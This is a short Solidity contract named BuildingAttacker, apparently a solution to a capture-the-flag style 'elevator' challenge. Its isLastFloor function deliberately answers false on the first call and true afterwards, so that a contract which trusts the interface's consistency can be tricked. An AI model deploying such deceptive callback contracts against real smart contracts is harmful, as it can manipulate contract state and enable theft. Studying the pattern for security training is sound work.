pragma solidity ^0.8.0;

contract BuildingAttacker {
    bool public firstCall = true;

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}